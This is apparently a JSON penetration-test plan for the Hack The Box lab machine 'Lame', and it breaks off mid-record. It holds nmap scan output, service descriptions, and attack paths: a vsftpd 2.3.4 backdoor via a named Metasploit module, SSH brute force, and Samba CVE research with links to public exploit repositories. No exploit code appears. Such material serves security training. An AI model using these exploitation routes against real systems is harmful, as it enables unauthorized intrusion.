{
    "pentest_name": "HTB__Lame",
    "target_ip": "10.10.10.3",
    "can_load_from_ui": false,
    "nmap_output": "Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-01 21:30 BST\nNSE: Loaded 155 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 21:30\nCompleted NSE at 21:30, 0.00s elapsed\nInitiating NSE at 21:30\nCompleted NSE at 21:30, 0.00s elapsed\nInitiating NSE at 21:30\nCompleted NSE at 21:30, 0.00s elapsed\nInitiating Parallel DNS resolution of 1 host. at 21:30\nCompleted Parallel DNS resolution of 1 host. at 21:30, 0.00s elapsed\nInitiating Connect Scan at 21:30\nScanning 10.10.10.3 [1000 ports]\nDiscovered open port 22/tcp on 10.10.10.3\nDiscovered open port 21/tcp on 10.10.10.3\nDiscovered open port 139/tcp on 10.10.10.3\nDiscovered open port 445/tcp on 10.10.10.3\nCompleted Connect Scan at 21:30, 5.81s elapsed (1000 total ports)\nInitiating Service scan at 21:30\nScanning 4 services on 10.10.10.3\nCompleted Service scan at 21:30, 11.23s elapsed (4 services on 1 host)\nNSE: Script scanning 10.10.10.3.\nInitiating NSE at 21:30\nNSE: [ftp-bounce] PORT response: 500 Illegal PORT command.\nCompleted NSE at 21:31, 40.08s elapsed\nInitiating NSE at 21:31\nCompleted NSE at 21:31, 0.51s elapsed\nInitiating NSE at 21:31\nCompleted NSE at 21:31, 0.00s elapsed\nNmap scan report for 10.10.10.3\nHost is up (0.072s latency).\nNot shown: 996 filtered tcp ports (no-response)\nPORT    STATE SERVICE     VERSION\n21/tcp  open  ftp         vsftpd 2.3.4\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to 10.10.14.34\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      vsFTPd 2.3.4 - secure, fast, stable\n|_End of status\n22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)\n| ssh-hostkey: \n|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)\n|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: mean: 2h00m20s, deviation: 2h49m44s, median: 18s\n| smb-os-discovery: \n|   OS: Unix (Samba 3.0.20-Debian)\n|   Computer name: lame\n|   NetBIOS computer name: \n|   Domain name: hackthebox.gr\n|   FQDN: lame.hackthebox.gr\n|_  System time: 2024-04-01T16:30:59-04:00\n|_smb2-time: Protocol negotiation failed (SMB2)\n| smb-security-mode: \n|   account_used: <blank>\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n\nNSE: Script Post-scanning.\nInitiating NSE at 21:31\nCompleted NSE at 21:31, 0.00s elapsed\nInitiating NSE at 21:31\nCompleted NSE at 21:31, 0.00s elapsed\nInitiating NSE at 21:31\nCompleted NSE at 21:31, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 57.91 seconds",
    "attack_surface": [
        {
            "port_number": 21,
            "detected_service_version": "vsftpd 2.3.4",
            "description": "FTP (File Transfer Protocol) is a standard network protocol used for the transfer of files between a client and a server on a computer network. vsftpd (Very Secure FTP Daemon) is an FTP server software known for its security and performance."
        },
        {
            "port_number": 22,
            "detected_service_version": "OpenSSH 4.7p1 Debian 8ubuntu1",
            "description": "SSH (Secure Shell) is a cryptographic network protocol used for secure remote login, command execution, and file transfer. OpenSSH is a widely used implementation of SSH that provides secure access to remote systems."
        },
        {
            "port_number": 139,
            "detected_service_version": "Samba smbd 3.X - 4.X",
            "description": "Samba is an open-source implementation of the SMB/CIFS networking protocol used for file and printer sharing between computers. The smbd service provides file sharing capabilities for Unix and Linux systems."
        },
        {
            "port_number": 445,
            "detected_service_version": "Samba smbd 3.0.20-Debian",
            "description": "Port 445 is also used by the Samba smbd service, which provides file sharing capabilities using the SMB/CIFS protocol. This version of Samba is specific to Debian Linux."
        }
    ],
    "attack_paths": [
        {
            "path_name": "FTP Anonymous Login",
            "description": "Exploit the anonymous FTP login to gain access to the system.",
            "service_name": "vsftpd",
            "version": "2.3.4",
            "steps": [
                {
                    "step_name": "Enumerate FTP service",
                    "tool_name": "nmap",
                    "description": "Use nmap to confirm the FTP service version and check if anonymous login is allowed.",
                    "command": "nmap -p 21 --script=ftp-anon 10.10.10.3",
                    "command_description": "Use nmap to confirm the FTP service version and check if anonymous login is allowed."
                },
                {
                    "step_name": "Exploit FTP Backdoor",
                    "tool_name": "Metasploit",
                    "description": "Use Metasploit module 'exploit/unix/ftp/vsftpd_234_backdoor' to exploit the FTP backdoor vulnerability in vsftpd 2.3.4 and gain a remote shell on the target machine."
                }
            ],
            "research": {
                "vulns": [
                    {
                        "cpe": "cpe:2.3:a:vsftpd_project:vsftpd:2.3.4:*:*:*:*:*:*:*",
                        "cves": [
                            {
                                "cve_id": "CVE-2011-2523",
                                "description": "vsftpd 2.3.4 downloaded between 20110630 and 20110703 contains a backdoor which opens a shell on port 6200/tcp.",
                                "weaknesses": [
                                    "CWE-78"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2011-2523",
                                "exploit_info_links": [
                                    "https://github.com/0xSojalSec/CVE-2011-2523",
                                    "https://github.com/NullBrunk/CVE-2011-2523",
                                    "https://github.com/0xSojalSec/-CVE-2011-2523",
                                    "https://github.com/Lynk4/CVE-2011-2523",
                                    "https://github.com/chleba124/vsftpd-exploit",
                                    "https://github.com/Prestaa/vsftpd-2.3.4",
                                    "https://github.com/MFernstrom/OffensivePascal-CVE-2011-2523",
                                    "https://github.com/4m3rr0r/CVE-2011-2523-poc",
                                    "https://github.com/vaishnavucv/CVE-2011-2523",
                                    "https://github.com/0xFTW/CVE-2011-2523"
                                ]
                            },
                            {
                                "cve_id": "CVE-2021-3618",
                                "description": "ALPACA is an application layer protocol content confusion attack, exploiting TLS servers implementing different protocols but using compatible certificates, such as multi-domain or wildcard certificates. A MiTM attacker having access to victim's traffic at the TCP/IP layer can redirect traffic from one subdomain to another, resulting in a valid TLS session. This breaks the authentication of TLS and cross-protocol attacks may be possible where the behavior of one protocol service may compromise the other at the application layer.",
                                "weaknesses": [
                                    "CWE-295"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2021-3618",
                                "exploit_info_links": []
                            }
                        ]
                    }
                ],
                "references": [],
                "exploitdb": {
                    "title": "vsftpd 2.3.4 - Backdoor Command Execution"
                }
            },
            "notes": [
                "There is a backdoor associated with 2.3.4. Let's target that."
            ]
        },
        {
            "path_name": "SSH Brute Force",
            "description": "Perform a brute force attack on the SSH service to guess the credentials and gain access.",
            "service_name": "OpenSSH",
            "version": "4.7p1 Debian 8ubuntu1"
        },
        {
            "path_name": "Samba Exploit",
            "description": "Exploit a vulnerability in the Samba service to gain unauthorized access.",
            "service_name": "Samba",
            "version": "3.0.20",
            "research": {
                "vulns": [
                    {
                        "cpe": "cpe:2.3:a:samba:samba:3.0.20:-:*:*:*:*:*:*",
                        "cves": [
                            {
                                "cve_id": "CVE-2007-0452",
                                "description": "smbd in Samba 3.0.6 through 3.0.23d allows remote authenticated users to cause a denial of service (memory and CPU exhaustion) by renaming a file in a way that prevents a request from being removed from the deferred open queue, which triggers an infinite loop.",
                                "weaknesses": [
                                    "NVD-CWE-Other"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-0452",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2007-0454",
                                "description": "Format string vulnerability in the afsacl.so VFS module in Samba 3.0.6 through 3.0.23d allows context-dependent attackers to execute arbitrary code via format string specifiers in a filename on an AFS file system, which is not properly handled during Windows ACL mapping.",
                                "weaknesses": [
                                    "CWE-134"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-0454",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2007-2446",
                                "description": "Multiple heap-based buffer overflows in the NDR parsing in smbd in Samba 3.0.0 through 3.0.25rc3 allow remote attackers to execute arbitrary code via crafted MS-RPC requests involving (1) DFSEnum (netdfs_io_dfs_EnumInfo_d), (2) RFNPCNEX (smb_io_notify_option_type_data), (3) LsarAddPrivilegesToAccount (lsa_io_privilege_set), (4) NetSetFileSecurity (sec_io_acl), or (5) LsarLookupSids/LsarLookupSids2 (lsa_io_trans_names).",
                                "weaknesses": [
                                    "CWE-119"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-2446",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2007-2447",
                                "description": "The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the \"username map script\" smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management.",
                                "weaknesses": [
                                    "NVD-CWE-Other"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-2447",
                                "exploit_info_links": [
                                    "https://github.com/MikeRega7/CVE-2007-2447-RCE",
                                    "https://github.com/mr-l0n3lly/CVE-2007-2447",
                                    "https://github.com/Nosferatuvjr/Samba-Usermap-exploit",
                                    "https://github.com/Aviksaikat/CVE-2007-2447",
                                    "https://github.com/0xTabun/CVE-2007-2447",
                                    "https://github.com/Juantos/cve-2007-2447",
                                    "https://github.com/bdunlap9/CVE-2007-2447_python",
                                    "https://github.com/HerculesRD/PyUsernameMapScriptRCE",
                                    "https://github.com/mmezirard/cve-2007-2447",
                                    "https://github.com/xbufu/CVE-2007-2447"
                                ]
                            },
                            {
                                "cve_id": "CVE-2007-4572",
                                "description": "Stack-based buffer overflow in nmbd in Samba 3.0.0 through 3.0.26a, when configured as a Primary or Backup Domain controller, allows remote attackers to have an unknown impact via crafted GETDC mailslot requests, related to handling of GETDC logon server requests.",
                                "weaknesses": [
                                    "CWE-119"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-4572",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2007-5398",
                                "description": "Stack-based buffer overflow in the reply_netbios_packet function in nmbd/nmbd_packets.c in nmbd in Samba 3.0.0 through 3.0.26a, when operating as a WINS server, allows remote attackers to execute arbitrary code via crafted WINS Name Registration requests followed by a WINS Name Query request.",
                                "weaknesses": [
                                    "CWE-119"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-5398",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2007-6015",
                                "description": "Stack-based buffer overflow in the send_mailslot function in nmbd in Samba 3.0.0 through 3.0.27a, when the \"domain logons\" option is enabled, allows remote attackers to execute arbitrary code via a GETDC mailslot request composed of a long GETDC string following an offset username in a SAMLOGON logon request.",
                                "weaknesses": [
                                    "CWE-119"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-6015",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2008-1105",
                                "description": "Heap-based buffer overflow in the receive_smb_raw function in util/sock.c in Samba 3.0.0 through 3.0.29 allows remote attackers to execute arbitrary code via a crafted SMB response.",
                                "weaknesses": [
                                    "CWE-119"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2008-1105",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2009-2813",
                                "description": "Samba 3.4 before 3.4.2, 3.3 before 3.3.8, 3.2 before 3.2.15, and 3.0.12 through 3.0.36, as used in the SMB subsystem in Apple Mac OS X 10.5.8 when Windows File Sharing is enabled, Fedora 11, and other operating systems, does not properly handle errors in resolving pathnames, which allows remote authenticated users to bypass intended sharing restrictions, and read, create, or modify files, in certain circumstances involving user accounts that lack home directories.",
                                "weaknesses": [
                                    "CWE-264"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2009-2813",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2009-2906",
                                "description": "smbd in Samba 3.0 before 3.0.37, 3.2 before 3.2.15, 3.3 before 3.3.8, and 3.4 before 3.4.2 allows remote authenticated users to cause a denial of service (infinite loop) via an unanticipated oplock break notification reply packet.",
                                "weaknesses": [
                                    "CWE-835"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2009-2906",
                                "exploit_info_links": []
                            }
                        ]
                    },
                    {
                        "cpe": "cpe:2.3:a:samba:samba:3.0.20:a:*:*:*:*:*:*",
                        "cves": [
                            {
                                "cve_id": "CVE-2007-0452",
                                "description": "smbd in Samba 3.0.6 through 3.0.23d allows remote authenticated users to cause a denial of service (memory and CPU exhaustion) by renaming a file in a way that prevents a request from being removed from the deferred open queue, which triggers an infinite loop.",
                                "weaknesses": [
                                    "NVD-CWE-Other"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-0452",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2007-0454",
                                "description": "Format string vulnerability in the afsacl.so VFS module in Samba 3.0.6 through 3.0.23d allows context-dependent attackers to execute arbitrary code via format string specifiers in a filename on an AFS file system, which is not properly handled during Windows ACL mapping.",
                                "weaknesses": [
                                    "CWE-134"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-0454",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2007-2446",
                                "description": "Multiple heap-based buffer overflows in the NDR parsing in smbd in Samba 3.0.0 through 3.0.25rc3 allow remote attackers to execute arbitrary code via crafted MS-RPC requests involving (1) DFSEnum (netdfs_io_dfs_EnumInfo_d), (2) RFNPCNEX (smb_io_notify_option_type_data), (3) LsarAddPrivilegesToAccount (lsa_io_privilege_set), (4) NetSetFileSecurity (sec_io_acl), or (5) LsarLookupSids/LsarLookupSids2 (lsa_io_trans_names).",
                                "weaknesses": [
                                    "CWE-119"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-2446",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2007-2447",
                                "description": "The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the \"username map script\" smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management.",
                                "weaknesses": [
                                    "NVD-CWE-Other"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-2447",
                                "exploit_info_links": [
                                    "https://github.com/MikeRega7/CVE-2007-2447-RCE",
                                    "https://github.com/mr-l0n3lly/CVE-2007-2447",
                                    "https://github.com/Nosferatuvjr/Samba-Usermap-exploit",
                                    "https://github.com/Aviksaikat/CVE-2007-2447",
                                    "https://github.com/0xTabun/CVE-2007-2447",
                                    "https://github.com/Juantos/cve-2007-2447",
                                    "https://github.com/bdunlap9/CVE-2007-2447_python",
                                    "https://github.com/HerculesRD/PyUsernameMapScriptRCE",
                                    "https://github.com/mmezirard/cve-2007-2447",
                                    "https://github.com/xbufu/CVE-2007-2447"
                                ]
                            },
                            {
                                "cve_id": "CVE-2007-4572",
                                "description": "Stack-based buffer overflow in nmbd in Samba 3.0.0 through 3.0.26a, when configured as a Primary or Backup Domain controller, allows remote attackers to have an unknown impact via crafted GETDC mailslot requests, related to handling of GETDC logon server requests.",
                                "weaknesses": [
                                    "CWE-119"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-4572",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2007-5398",
                                "description": "Stack-based buffer overflow in the reply_netbios_packet function in nmbd/nmbd_packets.c in nmbd in Samba 3.0.0 through 3.0.26a, when operating as a WINS server, allows remote attackers to execute arbitrary code via crafted WINS Name Registration requests followed by a WINS Name Query request.",
                                "weaknesses": [
                                    "CWE-119"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-5398",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2007-6015",
                                "description": "Stack-based buffer overflow in the send_mailslot function in nmbd in Samba 3.0.0 through 3.0.27a, when the \"domain logons\" option is enabled, allows remote attackers to execute arbitrary code via a GETDC mailslot request composed of a long GETDC string following an offset username in a SAMLOGON logon request.",
                                "weaknesses": [
                                    "CWE-119"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-6015",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2008-1105",
                                "description": "Heap-based buffer overflow in the receive_smb_raw function in util/sock.c in Samba 3.0.0 through 3.0.29 allows remote attackers to execute arbitrary code via a crafted SMB response.",
                                "weaknesses": [
                                    "CWE-119"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2008-1105",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2009-2813",
                                "description": "Samba 3.4 before 3.4.2, 3.3 before 3.3.8, 3.2 before 3.2.15, and 3.0.12 through 3.0.36, as used in the SMB subsystem in Apple Mac OS X 10.5.8 when Windows File Sharing is enabled, Fedora 11, and other operating systems, does not properly handle errors in resolving pathnames, which allows remote authenticated users to bypass intended sharing restrictions, and read, create, or modify files, in certain circumstances involving user accounts that lack home directories.",
                                "weaknesses": [
                                    "CWE-264"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2009-2813",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2009-2906",
                                "description": "smbd in Samba 3.0 before 3.0.37, 3.2 before 3.2.15, 3.3 before 3.3.8, and 3.4 before 3.4.2 allows remote authenticated users to cause a denial of service (infinite loop) via an unanticipated oplock break notification reply packet.",
                                "weaknesses": [
                                    "CWE-835"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2009-2906",
                                "exploit_info_links": []
                            }
                        ]
                    },
                    {
                        "cpe": "cpe:2.3:a:samba:samba:3.0.20:b:*:*:*:*:*:*",
                        "cves": [
                            {
                                "cve_id": "CVE-2007-0452",
                                "description": "smbd in Samba 3.0.6 through 3.0.23d allows remote authenticated users to cause a denial of service (memory and CPU exhaustion) by renaming a file in a way that prevents a request from being removed from the deferred open queue, which triggers an infinite loop.",
                                "weaknesses": [
                                    "NVD-CWE-Other"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-0452",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2007-0454",
                                "description": "Format string vulnerability in the afsacl.so VFS module in Samba 3.0.6 through 3.0.23d allows context-dependent attackers to execute arbitrary code via format string specifiers in a filename on an AFS file system, which is not properly handled during Windows ACL mapping.",
                                "weaknesses": [
                                    "CWE-134"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-0454",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2007-2446",
                                "description": "Multiple heap-based buffer overflows in the NDR parsing in smbd in Samba 3.0.0 through 3.0.25rc3 allow remote attackers to execute arbitrary code via crafted MS-RPC requests involving (1) DFSEnum (netdfs_io_dfs_EnumInfo_d), (2) RFNPCNEX (smb_io_notify_option_type_data), (3) LsarAddPrivilegesToAccount (lsa_io_privilege_set), (4) NetSetFileSecurity (sec_io_acl), or (5) LsarLookupSids/LsarLookupSids2 (lsa_io_trans_names).",
                                "weaknesses": [
                                    "CWE-119"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-2446",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2007-2447",
                                "description": "The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the \"username map script\" smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management.",
                                "weaknesses": [
                                    "NVD-CWE-Other"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-2447",
                                "exploit_info_links": [
                                    "https://github.com/MikeRega7/CVE-2007-2447-RCE",
                                    "https://github.com/mr-l0n3lly/CVE-2007-2447",
                                    "https://github.com/Nosferatuvjr/Samba-Usermap-exploit",
                                    "https://github.com/Aviksaikat/CVE-2007-2447",
                                    "https://github.com/0xTabun/CVE-2007-2447",
                                    "https://github.com/Juantos/cve-2007-2447",
                                    "https://github.com/bdunlap9/CVE-2007-2447_python",
                                    "https://github.com/HerculesRD/PyUsernameMapScriptRCE",
                                    "https://github.com/mmezirard/cve-2007-2447",
                                    "https://github.com/xbufu/CVE-2007-2447"
                                ]
                            },
                            {
                                "cve_id": "CVE-2007-4572",
                                "description": "Stack-based buffer overflow in nmbd in Samba 3.0.0 through 3.0.26a, when configured as a Primary or Backup Domain controller, allows remote attackers to have an unknown impact via crafted GETDC mailslot requests, related to handling of GETDC logon server requests.",
                                "weaknesses": [
                                    "CWE-119"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-4572",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2007-5398",
                                "description": "Stack-based buffer overflow in the reply_netbios_packet function in nmbd/nmbd_packets.c in nmbd in Samba 3.0.0 through 3.0.26a, when operating as a WINS server, allows remote attackers to execute arbitrary code via crafted WINS Name Registration requests followed by a WINS Name Query request.",
                                "weaknesses": [
                                    "CWE-119"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-5398",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2007-6015",
                                "description": "Stack-based buffer overflow in the send_mailslot function in nmbd in Samba 3.0.0 through 3.0.27a, when the \"domain logons\" option is enabled, allows remote attackers to execute arbitrary code via a GETDC mailslot request composed of a long GETDC string following an offset username in a SAMLOGON logon request.",
                                "weaknesses": [
                                    "CWE-119"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-6015",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2008-1105",
                                "description": "Heap-based buffer overflow in the receive_smb_raw function in util/sock.c in Samba 3.0.0 through 3.0.29 allows remote attackers to execute arbitrary code via a crafted SMB response.",
                                "weaknesses": [
                                    "CWE-119"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2008-1105",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2009-2813",
                                "description": "Samba 3.4 before 3.4.2, 3.3 before 3.3.8, 3.2 before 3.2.15, and 3.0.12 through 3.0.36, as used in the SMB subsystem in Apple Mac OS X 10.5.8 when Windows File Sharing is enabled, Fedora 11, and other operating systems, does not properly handle errors in resolving pathnames, which allows remote authenticated users to bypass intended sharing restrictions, and read, create, or modify files, in certain circumstances involving user accounts that lack home directories.",
                                "weaknesses": [
                                    "CWE-264"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2009-2813",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2009-2906",
                                "description": "smbd in Samba 3.0 before 3.0.37, 3.2 before 3.2.15, 3.3 before 3.3.8, and 3.4 before 3.4.2 allows remote authenticated users to cause a denial of service (infinite loop) via an unanticipated oplock break notification reply packet.",
                                "weaknesses": [
                                    "CWE-835"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2009-2906",
                                "exploit_info_links": []
                            }
                        ]
                    },
                    {
                        "cpe": "cpe:2.3:a:samba:samba:3.0.20a:*:*:*:*:*:*:*",
                        "cves": [
                            {
                                "cve_id": "CVE-2006-3403",
                                "description": "The smdb daemon (smbd/service.c) in Samba 3.0.1 through 3.0.22 allows remote attackers to cause a denial of service (memory consumption) via a large number of share connection requests.",
                                "weaknesses": [
                                    "NVD-CWE-Other"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2006-3403",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2007-0452",
                                "description": "smbd in Samba 3.0.6 through 3.0.23d allows remote authenticated users to cause a denial of service (memory and CPU exhaustion) by renaming a file in a way that prevents a request from being removed from the deferred open queue, which triggers an infinite loop.",
                                "weaknesses": [
                                    "NVD-CWE-Other"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-0452",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2007-0454",
                                "description": "Format string vulnerability in the afsacl.so VFS module in Samba 3.0.6 through 3.0.23d allows context-dependent attackers to execute arbitrary code via format string specifiers in a filename on an AFS file system, which is not properly handled during Windows ACL mapping.",
                                "weaknesses": [
                                    "CWE-134"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-0454",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2007-2446",
                                "description": "Multiple heap-based buffer overflows in the NDR parsing in smbd in Samba 3.0.0 through 3.0.25rc3 allow remote attackers to execute arbitrary code via crafted MS-RPC requests involving (1) DFSEnum (netdfs_io_dfs_EnumInfo_d), (2) RFNPCNEX (smb_io_notify_option_type_data), (3) LsarAddPrivilegesToAccount (lsa_io_privilege_set), (4) NetSetFileSecurity (sec_io_acl), or (5) LsarLookupSids/LsarLookupSids2 (lsa_io_trans_names).",
                                "weaknesses": [
                                    "CWE-119"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-2446",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2007-2447",
                                "description": "The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the \"username map script\" smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management.",
                                "weaknesses": [
                                    "NVD-CWE-Other"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-2447",
                                "exploit_info_links": [
                                    "https://github.com/MikeRega7/CVE-2007-2447-RCE",
                                    "https://github.com/mr-l0n3lly/CVE-2007-2447",
                                    "https://github.com/Nosferatuvjr/Samba-Usermap-exploit",
                                    "https://github.com/Aviksaikat/CVE-2007-2447",
                                    "https://github.com/0xTabun/CVE-2007-2447",
                                    "https://github.com/Juantos/cve-2007-2447",
                                    "https://github.com/bdunlap9/CVE-2007-2447_python",
                                    "https://github.com/HerculesRD/PyUsernameMapScriptRCE",
                                    "https://github.com/mmezirard/cve-2007-2447",
                                    "https://github.com/xbufu/CVE-2007-2447"
                                ]
                            },
                            {
                                "cve_id": "CVE-2007-4572",
                                "description": "Stack-based buffer overflow in nmbd in Samba 3.0.0 through 3.0.26a, when configured as a Primary or Backup Domain controller, allows remote attackers to have an unknown impact via crafted GETDC mailslot requests, related to handling of GETDC logon server requests.",
                                "weaknesses": [
                                    "CWE-119"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-4572",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2007-5398",
                                "description": "Stack-based buffer overflow in the reply_netbios_packet function in nmbd/nmbd_packets.c in nmbd in Samba 3.0.0 through 3.0.26a, when operating as a WINS server, allows remote attackers to execute arbitrary code via crafted WINS Name Registration requests followed by a WINS Name Query request.",
                                "weaknesses": [
                                    "CWE-119"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-5398",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2007-6015",
                                "description": "Stack-based buffer overflow in the send_mailslot function in nmbd in Samba 3.0.0 through 3.0.27a, when the \"domain logons\" option is enabled, allows remote attackers to execute arbitrary code via a GETDC mailslot request composed of a long GETDC string following an offset username in a SAMLOGON logon request.",
                                "weaknesses": [
                                    "CWE-119"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-6015",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2008-1105",
                                "description": "Heap-based buffer overflow in the receive_smb_raw function in util/sock.c in Samba 3.0.0 through 3.0.29 allows remote attackers to execute arbitrary code via a crafted SMB response.",
                                "weaknesses": [
                                    "CWE-119"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2008-1105",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2009-2813",
                                "description": "Samba 3.4 before 3.4.2, 3.3 before 3.3.8, 3.2 before 3.2.15, and 3.0.12 through 3.0.36, as used in the SMB subsystem in Apple Mac OS X 10.5.8 when Windows File Sharing is enabled, Fedora 11, and other operating systems, does not properly handle errors in resolving pathnames, which allows remote authenticated users to bypass intended sharing restrictions, and read, create, or modify files, in certain circumstances involving user accounts that lack home directories.",
                                "weaknesses": [
                                    "CWE-264"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2009-2813",
                                "exploit_info_links": []
                            }
                        ]
                    },
                    {
                        "cpe": "cpe:2.3:a:samba:samba:3.0.20b:*:*:*:*:*:*:*",
                        "cves": [
                            {
                                "cve_id": "CVE-2006-3403",
                                "description": "The smdb daemon (smbd/service.c) in Samba 3.0.1 through 3.0.22 allows remote attackers to cause a denial of service (memory consumption) via a large number of share connection requests.",
                                "weaknesses": [
                                    "NVD-CWE-Other"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2006-3403",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2007-0452",
